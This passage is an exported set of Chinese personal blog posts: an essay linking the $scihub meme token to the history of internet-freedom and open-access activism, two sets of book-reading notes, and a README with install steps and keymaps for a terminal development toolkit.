[{"content":"2024年11月16日到20号，不太平静的MEME圈中发生了一件有趣的事情。简单来说，一个北大出身的大V(0xAA_Science)发现了一个已经被原始开发者脱手的meme: scihub，并意识到了这是一个好机会，或许是帮助DeSci(去中心化学术)的好机会，亦或是赚钱的好机会，当然，更有可能的是二者兼有，总之，他购入了20%的scihub代币，并联系Scihub的创始人 Alexandra Elbakyan 计划分批次将代币捐赠。\n一开始，Alexandra 的态度是合理的质疑，一方面，分批次的捐助很难不让人起疑心; 另一方面，对于不怎么关注币圈的她来说，将代币冠以scihub的名字在市场上流通，很难不让人觉得这是一种亵渎，尤其是以知识平权为目标的scihub。\n而对于常年混迹web3的投资客们，这种行为也无异于巧妙的营销: DeSci的理念和背靠的扎实项目，让$scihub的叙事成为了乱七八糟的meme众生中的一股清流，而且通过捐助行为，让这个原本无人问津的代币与scihub的联系从仅仅同名上升到了利益相关。在今天的代币海洋，哪怕多几个人喊喊口号炒作炒作故事和概念都可以让代币一飞冲天，更别提如果背靠扎实而具体并且运营多年的项目了。\n好了，关于币圈的内容先暂停，现在谈谈所谓的DeSci概念的源头: 知识平权。\n与其他平权运动相同，知识平权也起源于自由意志主义，在互联网黑客中，这体现为网络自由意志主义，其重点在于，减少政府管制审查或其他干涉互联网\u0026quot;自由\u0026quot;的行为。在当时，新兴的互联网通讯技术令政府处于认知混乱的状态，在执法过程中出现了不少侵犯个人自由的案例。\n在此背景下，约翰·吉尔摩等人于1970年成立了电子前线基金会 (Electronic Frontier Foundation)，其主要使命是:\n帮助公众了解更多有关计算机和通信领域发展带来的机遇与挑战 促使政策制定者对那些构成通信的自由和开放的基本问题有更好的了解 提高公众对随新计算机通信媒介迅速发展而产生的公民自由问题的认识 为那些受到毫无根据或误导的法律威胁的新技术和个人进行辩护 鼓励和支持新技术的开发，帮助非技术用户可不受任何影响且方便地接触到新通信技术 电子前线基金会为推进当时的互联网自由发挥过不少作用，但更重要的是，它为当时为数不多但在日后具备更多互联网话语权的技术极客们或多或少地传递了自己的理念， 这其中就包括Reddit的联合创始人，同时也是RSS格式和Markdown格式的开发者，“互联网之子” Aaron Hillel Swartz。\n受EFF的影响，Aaron在年少的时候就积极参与网络自由相关的事业：14岁参与开发RSS1.0版本，帮助创办了先进社会变革活动委员会，成功制止《禁止网络盗版法案》的颁布等等。\n2008年时，Aaron 做出了一个轰动一时的举动：从政府的收费数据库系统中下载了大约270万份联邦法院的文件并让网络大众免费访问。不过按照法律，政府文件不受版权法保护，这些文件原本就是应该公开的，因此即便受到了FBI的调查，Aaron也没有被控告。“幸运” 的他继续在英文维基百科中进行着从2003年以来的编辑活动，在美国政治机构、政府官员等主题上添加了许多条目。\n直到他自杀的那一天。\n2011年1月6日晚，斯沃茨在哈佛大学校园附近被警察和特工逮捕， 他们发现 Aaron 通过MIT的校园网下载了大量的期刊文章，因此以非法从受保护的计算机中获取信息的罪名检控 Aaron。 而在联邦检察官的介入下，Aaron 新增了九项重罪，面临最高50年的监禁和100万罚款! 在压力下，Aaron选择了上吊。\nAaron的死亡无疑代表了当时美国司法系统中的过分检控和恐吓，更重要的是，他成为了一个符号，一个殉道者，他的死亡激起了全社会各界的广泛关注。人们在白宫网站上要求罢免为Aaron新增罪名的检察官，艺术界用各种涂鸦和壁画纪念他，黑客们攻入了MIT和政府的网站，将页面替换为了对Aaron的纪念和哀悼。\nAaron的死所带来的最深远影响，便是刺激了越来越多的人和组织参与到了开放获取和知识平权中的运动上来，以至于Journal of Library Administration 的一位编委会成员写道，在Aaron死后，“在非开放获取刊物上发表要受到良知的谴责”。可以说Scihub就是这股运动的继承者。\n与其他鼓吹scihub的言论相比，我并不是很看重它在免费获取论文上的效果，就个人的有限体验而言，我查询的文献中依旧有很大一部分是scihub没有收录的，而研究生期间，通过学校的校园网就可以下载到那些需要付费订阅的论文，也没有使用scihub的刚需，不过它的存在和发展依旧是值得被认可和支持的，不仅仅是为了它为了那些没有条件的科研人员做出的虽然有限但切实存在的平权努力，更是为了那份传承了三十余年的精神图腾，它让人们在陈腐的商业世界中，依旧能够看到理想主义和早期互联网自由精神的余辉。\n当然，Alexandra 依旧面临着严峻的知识封锁和法律风险，以及更现实的经济问题。尽管有不少志愿者试图传播和帮助Scihub，但范围有限，效果甚微， 部分原因在于，互联网的新生一代正逐渐掌握话语权，而他们生活在一个被前辈\u0026quot;修正\u0026quot;过了的网络世界， 没有经历过矛盾的冲突和历史性的运动，缺乏对网络自由意志主义的认知和体会，最多便是称道一声Respect。 好比只有当你是上世纪三四十年代的中国农民时，才能真正体会到今天政治书里的陈词滥调在当年确实是救国图存的存在。\n社会的健忘不仅为知识平权带来了困难，也让其他曾经被\u0026quot;修复\u0026quot;过的那些问题重新浮现，甚至变得更加高明和棘手，因为政府和商业公司已经学会温水煮青蛙的模式慢慢侵犯用户，而时间和健忘是他们的盟友。试问有谁记得谷歌曾经在自己的行为准则开头中承诺过\u0026quot;Don\u0026rsquo;t be evil\u0026quot;呢? 大部分的人仅仅关心自己的需求能不能满足，至于那\u0026quot;小小\u0026quot;的隐私侵犯? 或许让人不快，但那又如何?\n可以说，互联网的历史，就是人们用隐私和自由换取便利的历史，即便这种交易有时候并不等价。\n回到web3，这是一个黑暗森林，也是一个充满了机会的地方。除了为Scihub的推广带来了便利之外，去中心化技术的本质核心，也就是加密技术，同样是当年网络自由意志主义的产物，其背后的一些故事也同样颇具传奇色彩。\n1991年，菲尔·齐默曼为了让所有人可以安全访问BBS和存储信息，开发了用于通讯加密的应用程序PGP(Pretty Good Privacy)并发布在互联网上供人免费使用。而在当时的美国，使用大于40位密钥的加密系统被视为军需品。PGP的密钥长度远远超出了这一限制，因此政府以\u0026quot;没有授权的军需品出口\u0026quot;为名对他发起调查，但齐默曼使用了一个天才般的想法去对抗规定: 他将PGP的源代码出版为一本书。\n与军需品出口不同，书本出口和传播符合美国宪法第一修正案中的言论自由部分，因而受到保护，法院因此判定齐默曼无罪。这个案件深刻影响了后来类似案件的司法裁定，而PGP依旧继续发挥着隐私保护的强大作用，它的后辈GPG (GnuPG) 帮助 Edward Joseph Snowden 在逃亡期间联系新闻界，一举揭发了2013年引爆全球的美国棱镜计划。\n现如今，加密技术最广为人知的应用之一: 加密货币，当初也是密码学极客当初用来抵御政府的工具，今天的它正在借助其病毒式的传播性和吸引力，让越来越多的人关注到了Scihub这样一个长期运营但始终磕磕绊绊的项目中来，考虑到它们都可以追溯到五十年前的文化和网络自由意志，即便或许相当不纯粹，这样的联合还是颇有种分家多年的兄弟姐妹互帮互助的感觉。\n的确，一个普遍的常识是，币圈里没有什么纯粹的好人，大部分购入$scihub以及其他DeSci项目的人都是投机客，在丰富的投资经验下，众多meme的空洞而千篇一律的叙事已经无法满足这帮挑剔的老狐狸了，选择 $scihub 和其他 DeSci，只是选择了一个相对可靠而坚实并且有靠山的叙事，一处借着理想主义发泄投机欲望的渠道。至于知识平权和开放获取，虽然足够理想也足够动人，但由于上述的原因，终究还是只能被少数人真正领会而不仅仅只是沦为口号。\n可即便如此，我还是对这场\u0026quot;合作\u0026quot;的结果抱有兴趣，我想知道，当理想主义者遇上那些抱着狂躁的欲望和手中的热钱的极客、投机犯、骗子、自大狂和狂信徒时，当盲目的资本遇上纯粹的公民运动时，它们是会在不牺牲任何一方原始立场的情况下以一种默契的平衡关系持续协作，还是相互竞争直到一方被吞噬而沦落为另一方所利用的工具? 如果前者能够成立，那么其带来的积极意义是否适用于其他领域? 而至于后者，我真真切切的不希望发生，因为在那种情况下，受伤害的一方必将有且只有Scihub。\n","permalink":"https://ch3n9w.github.io/posts/gossip-scihub/","summary":"\u003cp\u003e2024年11月16日到20号，不太平静的MEME圈中发生了一件有趣的事情。简单来说，一个北大出身的大V(0xAA_Science)发现了一个已经被原始开发者脱手的meme: scihub，并意识到了这是一个好机会，或许是帮助DeSci(去中心化学术)的好机会，亦或是赚钱的好机会，当然，更有可能的是二者兼有，总之，他购入了20%的scihub代币，并联系Scihub的创始人 Alexandra Elbakyan 计划分批次将代币捐赠。\u003c/p\u003e\n\u003cp\u003e一开始，Alexandra 的态度是合理的质疑，一方面，分批次的捐助很难不让人起疑心; 另一方面，对于不怎么关注币圈的她来说，将代币冠以scihub的名字在市场上流通，很难不让人觉得这是一种亵渎，尤其是以知识平权为目标的scihub。\u003c/p\u003e\n\u003cp\u003e而对于常年混迹web3的投资客们，这种行为也无异于巧妙的营销: DeSci的理念和背靠的扎实项目，让$scihub的叙事成为了乱七八糟的meme众生中的一股清流，而且通过捐助行为，让这个原本无人问津的代币与scihub的联系从仅仅同名上升到了利益相关。在今天的代币海洋，哪怕多几个人喊喊口号炒作炒作故事和概念都可以让代币一飞冲天，更别提如果背靠扎实而具体并且运营多年的项目了。\u003c/p\u003e\n\u003cp\u003e好了，关于币圈的内容先暂停，现在谈谈所谓的DeSci概念的源头: 知识平权。\u003c/p\u003e\n\u003cp\u003e与其他平权运动相同，知识平权也起源于自由意志主义，在互联网黑客中，这体现为网络自由意志主义，其重点在于，减少政府管制审查或其他干涉互联网\u0026quot;自由\u0026quot;的行为。在当时，新兴的互联网通讯技术令政府处于认知混乱的状态，在执法过程中出现了不少侵犯个人自由的案例。\u003c/p\u003e\n\u003cp\u003e在此背景下，约翰·吉尔摩等人于1970年成立了电子前线基金会 (Electronic Frontier Foundation)，其主要使命是:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e帮助公众了解更多有关计算机和通信领域发展带来的机遇与挑战\u003c/li\u003e\n\u003cli\u003e促使政策制定者对那些构成通信的自由和开放的基本问题有更好的了解\u003c/li\u003e\n\u003cli\u003e提高公众对随新计算机通信媒介迅速发展而产生的公民自由问题的认识\u003c/li\u003e\n\u003cli\u003e为那些受到毫无根据或误导的法律威胁的新技术和个人进行辩护\u003c/li\u003e\n\u003cli\u003e鼓励和支持新技术的开发，帮助非技术用户可不受任何影响且方便地接触到新通信技术\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e电子前线基金会为推进当时的互联网自由发挥过不少作用，但更重要的是，它为当时为数不多但在日后具备更多互联网话语权的技术极客们或多或少地传递了自己的理念， 这其中就包括Reddit的联合创始人，同时也是RSS格式和Markdown格式的开发者，“互联网之子” Aaron Hillel Swartz。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./aaron.jpg\" alt=\"Aaron\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e受EFF的影响，Aaron在年少的时候就积极参与网络自由相关的事业：14岁参与开发RSS1.0版本，帮助创办了先进社会变革活动委员会，成功制止《禁止网络盗版法案》的颁布等等。\u003c/p\u003e\n\u003cp\u003e2008年时，Aaron 做出了一个轰动一时的举动：从政府的收费数据库系统中下载了大约270万份联邦法院的文件并让网络大众免费访问。不过按照法律，政府文件不受版权法保护，这些文件原本就是应该公开的，因此即便受到了FBI的调查，Aaron也没有被控告。“幸运” 的他继续在英文维基百科中进行着从2003年以来的编辑活动，在美国政治机构、政府官员等主题上添加了许多条目。\u003c/p\u003e\n\u003cp\u003e直到他自杀的那一天。\u003c/p\u003e\n\u003cp\u003e2011年1月6日晚，斯沃茨在哈佛大学校园附近被警察和特工逮捕， 他们发现 Aaron 通过MIT的校园网下载了大量的期刊文章，因此以非法从受保护的计算机中获取信息的罪名检控 Aaron。 而在联邦检察官的介入下，Aaron 新增了九项重罪，面临最高50年的监禁和100万罚款! 在压力下，Aaron选择了上吊。\u003c/p\u003e\n\u003cp\u003eAaron的死亡无疑代表了当时美国司法系统中的过分检控和恐吓，更重要的是，他成为了一个符号，一个殉道者，他的死亡激起了全社会各界的广泛关注。人们在白宫网站上要求罢免为Aaron新增罪名的检察官，艺术界用各种涂鸦和壁画纪念他，黑客们攻入了MIT和政府的网站，将页面替换为了对Aaron的纪念和哀悼。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./art.jpg\" alt=\"纪念\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAaron的死所带来的最深远影响，便是刺激了越来越多的人和组织参与到了开放获取和知识平权中的运动上来，以至于Journal of Library Administration 的一位编委会成员写道，在Aaron死后，“在非开放获取刊物上发表要受到良知的谴责”。可以说Scihub就是这股运动的继承者。\u003c/p\u003e\n\u003cp\u003e与其他鼓吹scihub的言论相比，我并不是很看重它在免费获取论文上的效果，就个人的有限体验而言，我查询的文献中依旧有很大一部分是scihub没有收录的，而研究生期间，通过学校的校园网就可以下载到那些需要付费订阅的论文，也没有使用scihub的刚需，不过它的存在和发展依旧是值得被认可和支持的，不仅仅是为了它为了那些没有条件的科研人员做出的虽然有限但切实存在的平权努力，更是为了那份传承了三十余年的精神图腾，它让人们在陈腐的商业世界中，依旧能够看到理想主义和早期互联网自由精神的余辉。\u003c/p\u003e\n\u003cp\u003e当然，Alexandra 依旧面临着严峻的知识封锁和法律风险，以及更现实的经济问题。尽管有不少志愿者试图传播和帮助Scihub，但范围有限，效果甚微， 部分原因在于，互联网的新生一代正逐渐掌握话语权，而他们生活在一个被前辈\u0026quot;修正\u0026quot;过了的网络世界， 没有经历过矛盾的冲突和历史性的运动，缺乏对网络自由意志主义的认知和体会，最多便是称道一声Respect。 好比只有当你是上世纪三四十年代的中国农民时，才能真正体会到今天政治书里的陈词滥调在当年确实是救国图存的存在。\u003c/p\u003e\n\u003cp\u003e社会的健忘不仅为知识平权带来了困难，也让其他曾经被\u0026quot;修复\u0026quot;过的那些问题重新浮现，甚至变得更加高明和棘手，因为政府和商业公司已经学会温水煮青蛙的模式慢慢侵犯用户，而时间和健忘是他们的盟友。试问有谁记得谷歌曾经在自己的行为准则开头中承诺过\u0026quot;Don\u0026rsquo;t be evil\u0026quot;呢? 大部分的人仅仅关心自己的需求能不能满足，至于那\u0026quot;小小\u0026quot;的隐私侵犯? 或许让人不快，但那又如何?\u003c/p\u003e\n\u003cp\u003e可以说，互联网的历史，就是人们用隐私和自由换取便利的历史，即便这种交易有时候并不等价。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./google.png\" alt=\"google\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e回到web3，这是一个黑暗森林，也是一个充满了机会的地方。除了为Scihub的推广带来了便利之外，去中心化技术的本质核心，也就是加密技术，同样是当年网络自由意志主义的产物，其背后的一些故事也同样颇具传奇色彩。\u003c/p\u003e\n\u003cp\u003e1991年，菲尔·齐默曼为了让所有人可以安全访问BBS和存储信息，开发了用于通讯加密的应用程序PGP(Pretty Good Privacy)并发布在互联网上供人免费使用。而在当时的美国，使用大于40位密钥的加密系统被视为军需品。PGP的密钥长度远远超出了这一限制，因此政府以\u0026quot;没有授权的军需品出口\u0026quot;为名对他发起调查，但齐默曼使用了一个天才般的想法去对抗规定: 他将PGP的源代码出版为一本书。\u003c/p\u003e\n\u003cp\u003e与军需品出口不同，书本出口和传播符合美国宪法第一修正案中的言论自由部分，因而受到保护，法院因此判定齐默曼无罪。这个案件深刻影响了后来类似案件的司法裁定，而PGP依旧继续发挥着隐私保护的强大作用，它的后辈GPG (GnuPG) 帮助 Edward Joseph Snowden 在逃亡期间联系新闻界，一举揭发了2013年引爆全球的美国棱镜计划。\u003c/p\u003e","title":"从$scihub到自由网络意志"},{"content":" 小说的主人公在偶遇一间奇妙的咖啡馆后, 通过店员们的引导开始思考起了人生的意义和价值, 并最终得到了启发.\n这里记录书中几个有意思的片段.\n有意义的三个问题:\n你为什么来这里 你害怕死亡吗 你满足吗 提出问题, 人的心灵才会去追寻答案\n每一天都是一个实现人生意义的机会，可以做我想做的事。不需要等到‘退休’\n我们每天都暴露在大量营销信息中，如果不谨慎点儿，我们肯定会把自己的幸福和满足寄托在某样产品或服务上。最后，我们会陷入一种财务困境，必须不断去做事情去挣钱，尽管那些事情不是我们真正想做的。而这会造成恶性循环\n转变心态的重点在于，你要清楚，某样东西是否能让你的生活更圆满，由你自己说了算，和别人告诉你它圆不圆满无关。\n想想, 如果我不需要‘逃离’或 ‘减压’，那我还会想买那些东西吗？如果我一直在做我想做的事，那么我应该没什么可‘逃离’的，也没那么多压力需要释放, 那么我真的需要通过工作去赚那么多钱吗?\n沉浸在爱好中的大多数人根本就不太关心自己运气好不好。他们只知道，当自己为实现存在意义而努力时，幸运的巧合就会自然出现，他们管这个叫顺其自然。\n有很多人为了钱或权力，说服其他人去相信，他们的产品或服务是实现人生圆满的关键。想象一下，如果大家都意识到，我们的满足感其实掌握在自己手中，那前面那种人就会受到巨大的威胁。说服他人的那些人将失去他们的力量。对于这类人，失去对他人的影响力可不是什么好事情。\n只有你真正了解自己存在的意义。永远不要因为其他人或事失去对自己命运的掌控。要积极地选择自己的人生道路，不然就只能被动接受安排。\n如何寻找人生意义和热爱的事物:\n人生意义的答案，全世界只有我们自己可以决定。所以很多人都在追寻答案的过程中选择独处。要是你整天被资讯和信息轰炸，就很难集中精力思考问题。 多去接触不同的新鲜事物。有人发现，一旦他们有新体验或者接触到新理念，有些体验或理念就会让他们产生共鸣。遇到他们热爱的事物时，很多人都有生理反应，比如汗毛倒竖、脊梁骨仿佛触电、喜极而泣等等。还有人会产生一种‘就是它’的感觉。这些都是找出自己存在意义的线索。 ","permalink":"https://ch3n9w.github.io/posts/read-the-why-cafe/","summary":"\u003cblockquote\u003e\n\u003cp\u003e小说的主人公在偶遇一间奇妙的咖啡馆后, 通过店员们的引导开始思考起了人生的意义和价值, 并最终得到了启发.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这里记录书中几个有意思的片段.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e有意义的三个问题:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e你为什么来这里\u003c/li\u003e\n\u003cli\u003e你害怕死亡吗\u003c/li\u003e\n\u003cli\u003e你满足吗\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e提出问题, 人的心灵才会去追寻答案\u003c/p\u003e\n\u003cp\u003e每一天都是一个实现人生意义的机会，可以做我想做的事。不需要等到‘退休’\u003c/p\u003e\n\u003cp\u003e我们每天都暴露在大量营销信息中，如果不谨慎点儿，我们肯定会把自己的幸福和满足寄托在某样产品或服务上。最后，我们会陷入一种财务困境，必须不断去做事情去挣钱，尽管那些事情不是我们真正想做的。而这会造成恶性循环\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e转变心态的重点在于，你要清楚，某样东西是否能让你的生活更圆满，由你自己说了算，和别人告诉你它圆不圆满无关。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e想想, 如果我不需要‘逃离’或 ‘减压’，那我还会想买那些东西吗？如果我一直在做我想做的事，那么我应该没什么可‘逃离’的，也没那么多压力需要释放, 那么我真的需要通过工作去赚那么多钱吗?\u003c/p\u003e\n\u003cp\u003e沉浸在爱好中的大多数人根本就不太关心自己运气好不好。他们只知道，当自己为实现存在意义而努力时，幸运的巧合就会自然出现，他们管这个叫顺其自然。\u003c/p\u003e\n\u003cp\u003e有很多人为了钱或权力，说服其他人去相信，他们的产品或服务是实现人生圆满的关键。想象一下，如果大家都意识到，我们的满足感其实掌握在自己手中，那前面那种人就会受到巨大的威胁。说服他人的那些人将失去他们的力量。对于这类人，失去对他人的影响力可不是什么好事情。\u003c/p\u003e\n\u003cp\u003e只有你真正了解自己存在的意义。永远不要因为其他人或事失去对自己命运的掌控。要积极地选择自己的人生道路，不然就只能被动接受安排。\u003c/p\u003e\n\u003cp\u003e如何寻找人生意义和热爱的事物:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e人生意义的答案，全世界只有我们自己可以决定。所以很多人都在追寻答案的过程中选择\u003cstrong\u003e独处\u003c/strong\u003e。要是你整天被资讯和信息轰炸，就很难集中精力思考问题。\u003c/li\u003e\n\u003cli\u003e多去接触不同的新鲜事物。有人发现，一旦他们有新体验或者接触到新理念，有些体验或理念就会让他们产生共鸣。遇到他们热爱的事物时，很多人都有生理反应，比如汗毛倒竖、脊梁骨仿佛触电、喜极而泣等等。还有人会产生一种‘就是它’的感觉。这些都是找出自己存在意义的线索。\u003c/li\u003e\n\u003c/ul\u003e","title":"《在世界尽头的咖啡馆》读书笔记"},{"content":" 声明: 此项目与那些声称要取代vscode等GUI工具的配置不同, 而是力图填补这些大型开发工具在终端环境下的空白\n项目地址: https://github.com/ch3n9w/dev, 后续README更新不会同步到这篇博客, 但是大体上秉承的思想不会改变: 极简、可用以及最少化心智负担\nDevelopment Toolkit 📡 A comprehensive and user-friendly development toolkit to boost up your productivity 🚀.\nterminal emulator: kitty shell: zsh editor: neovim terminal filemanager: lf multiplexers: tmux or kitty Try docker run -it --rm --name dev ch4xer/dev:latest /bin/zsh Install git clone https://github.com/ch3n9w/dev cd dev # install dependency software and install configuration ./scripts/install-software.sh Alternatively (if you dont want to install all of them), you can copy the configuration directory you like to XDG_CONFIG_HOME (commonly ~/.config), for example:\nnvim -\u0026gt; ~/.config/nvim kitty -\u0026gt; ~/.config/kitty tmux -\u0026gt; ~/.config/tmux lf -\u0026gt; ~/.config/lf zsh/zsh -\u0026gt; ~/.config/zsh zsh/zshrc -\u0026gt; ~/.zshrc starship/starship.toml -\u0026gt; ~/.config/starship.toml Noteable Info Kitty use Ctrl and Shift as modifier key for all shortcuts use JetbrainMono Nerd Font and LXGW WenKai as font Tmux use Alt and Ctrl as modifier key for all shortcuts set Alt-a as prefix key instead of Ctrl-b use tmux-continuum and resurrect to restore sessions. Zsh you can add software settings in zsh/zsh/software disable vim mode. Neovim Only use \u0026lt;=30 plugins to make Neovim tiny and good enough for editing Keymap Software Key Effect kitty C-t new tab kitty C-CR new window kitty C-w delete window kitty C-h/j/k/l focus other window kitty C-S-h/j/k/l move window kitty C-PgUp/PgDn goto other tab kitty C-S-PgUp/PgDn move tab kitty C-=/- adjust font size kitty f1 search content kitty f11 toggle zoom zsh C-r execute lf filemanager zsh C-e open filemanager-gui zsh C-Backspace delete word backward lf gh go to home (~) lf gd go to ~/Documents lf gn go to ~/Downloads lf H/L go to previous/next visited directory lf a mkdir lf t touch lf r rename file or directory lf o open with custom software lf . show hidden file lf ; execute shell command lf y copy lf d cut lf p paste lf D move to trash lf Delete rm lf f fuzzy search using fzf tmux M-a prefix key tmux M-h/j/k/l go to other pane tmux M-q kill pane tmux M-C-j/k swap with other panes tmux M-x split window horizontally tmux M-C-x split window vertically tmux M-f toggle zoom tmux M-t create new window tmux M-C-t rename window tmux M-PgUp/PgDn go to previous/next window tmux M-C-PgUp/PgDn swap with previous/next window tmux M-s choose session tmux M-C-s rename session tmux M-n create new session neovim q quit window/neovim neovim Q record macro neovim H/L go to the begin/end of line neovim Tab move to other window neovim ; enter commandline mode neovim g= format document neovim 2-LeftMouse/CR toggle fold neovim sw fuzzy search word neovim sf fuzzy search filename neovim z fuzzy search opened buffers neovim ga (lsp) code action neovim ge (lsp) show diagnostics in line neovim gh (lsp) get document neovim gn (lsp) rename symbol neovim gd (lsp) go to definition neovim gr (lsp) find reference neovim C-/ comment line neovim f flash jump neovim Tab/S-Tab code completions neovim t File Tree ","permalink":"https://ch3n9w.github.io/posts/tech-dev-2024/","summary":"\u003cblockquote\u003e\n\u003cp\u003e声明: 此项目与那些声称要取代vscode等GUI工具的配置不同, 而是力图填补这些大型开发工具在终端环境下的空白\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e项目地址: \u003ca href=\"https://github.com/ch3n9w/dev\"\u003ehttps://github.com/ch3n9w/dev\u003c/a\u003e, 后续README更新不会同步到这篇博客, 但是大体上秉承的思想不会改变: 极简、可用以及最少化心智负担\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"development-toolkit-\"\u003eDevelopment Toolkit 📡\u003c/h1\u003e\n\u003cp\u003eA comprehensive and user-friendly development toolkit to boost up your productivity 🚀.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eterminal emulator: \u003ca href=\"https://github.com/kovidgoyal/kitty\"\u003ekitty\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eshell: \u003ca href=\"https://www.zsh.org/\"\u003ezsh\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eeditor: \u003ca href=\"https://github.com/neovim/neovim\"\u003eneovim\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eterminal filemanager: \u003ca href=\"https://github.com/gokcehan/lf\"\u003elf\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003emultiplexers: \u003ca href=\"https://github.com/tmux/tmux\"\u003etmux\u003c/a\u003e or \u003ca href=\"https://github.com/kovidgoyal/kitty\"\u003ekitty\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"try\"\u003eTry\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker run -it --rm --name dev ch4xer/dev:latest /bin/zsh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"install\"\u003eInstall\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/ch3n9w/dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install dependency software and install configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./scripts/install-software.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAlternatively (if you dont want to install all of them), you can copy the configuration directory you like to \u003ccode\u003eXDG_CONFIG_HOME\u003c/code\u003e (commonly \u003ccode\u003e~/.config\u003c/code\u003e), for example:\u003c/p\u003e","title":"终端工具集(2024)"},{"content":"这本书主要介绍了在进行以提升理解力为目的的阅读时所应该掌握的技巧, 这些技巧可以帮助提升阅读的效率, 节约时间的同时抓住重点. 注意, 这些技巧并不会让阅读变得更轻松, 相反, 读者消耗的精力可能会更多, 因为这些技巧要求读者更多地发挥其主动性, 然而, 这些技巧能够帮助读者更好地提升自己的理解力和知识吸收的速度, 并且有针对性地运用有限的精力.\n本书并不谈论以消遣为目的的阅读活动, 也不会谈论单纯以获取资讯为目的的阅读活动, 尽管在提升理解力后, 获取资讯会更加迅速.\n四个层次的阅读 阅读的四个层次, 这几个层次是相互包含, 层层递进的:\n基础阅读: 熟悉理解并掌握词语和句子的意思 检视阅读: 在规定时间内从宏观层面上理解书中的重点, 从而判断值不值得读 系统性略读 阅读书名 序言 目录 从目录中挑几个与主题相关的篇章, 仔细阅读开头和结尾处的摘要说明 随便翻翻全书, 随时寻找主要论点, 不要忽略最后的两三页 粗浅阅读 从头到尾先读完一遍, 碰到不懂的地方不要停下来查询或思考, 只注意你能理解的地方, 不要为了一些没能立刻理解的地方而停顿, 这样就不会拘泥于局部 克服在🧠大脑中念出声的阅读方式, 头脑和眼睛不一样, 并不需要一次只\u0026quot;读\u0026quot;一个字或者句子 =\u0026gt; 利用手指在书页上的移动来引导眼睛和大脑 分析阅读: 全盘完整的阅读 (不完全适用于小说和诗集) 阶段一 为书籍分类(小说?爱情小说?论说类?经济学?历史?哲学?) =\u0026gt; 什么类型的房子 用几句话叙述整本书的内容 =\u0026gt; 房子的整体功能(整体性) 将重要篇章列举出来, 说明它们如何形成了整体 =\u0026gt; 砖瓦的功能和联系(复杂性) 阶段二 找出关键字, 确认每个字不同意义之间的转换, 与作者找出共通的语义 重新架构作者论述的前因后果 确定作者解决了什么问题, 还有哪些问题没有解决 阶段三: 对书本下评论 主题阅读: 面对一本书时去阅读许多同类型的其他书籍, 并相互对比 针对主题设计实验性书目, 找出并确定相关的书籍 阅读这些书籍的相关章节 建立中立的主旨和词汇, 列出一连串相关的问题 界定每个作者研究的主要和次要议题 分析这些讨论。这得把问题和议题按顺序排列，以求突显主题 所谓阅读速度, 不只是要能读得快, 还要能用不同的速度来阅读, 要知道什么时候用什么速度是恰当的.\n读者的自我要求 许多人尽管可以区分出阅读的获益与取乐之不同——其中一方是理解力的增进，另一方则是娱乐或只是满足一点点的好奇心——最后仍然无法完成他们的阅读目标。就算他们知道那本书该用什么样的方式来阅读，还是失败。原因就在他们不知道如何做个自我要求的阅读者，如何将精神集中在他们所做的事情上，而不会一无所获。\n读者要提出并回答四个基本问题 整体来说，这本书到底在谈些什么？ =\u0026gt; 主题 作者都说了什么，怎么说的？ =\u0026gt; 论点 这本书说得有道理吗？是全部有道理，还是部分有道理？ =\u0026gt; 思考与判断 这本书跟你有什么关系？ =\u0026gt; 知行合一 做笔记, 用自己的语言表达时会强迫进行思考 根据全书结构做笔记 加入作者的观点和自己的观点 针对情景进行讨论的笔记, 同时出现多本书的内容 ","permalink":"https://ch3n9w.github.io/posts/read-how-to-read-a-book/","summary":"\u003cp\u003e这本书主要介绍了在进行以提升理解力为目的的阅读时所应该掌握的技巧, 这些技巧可以帮助提升阅读的效率, 节约时间的同时抓住重点. 注意, 这些技巧并不会让阅读变得更轻松, 相反, 读者消耗的精力可能会更多, 因为这些技巧要求读者更多地发挥其主动性, 然而, 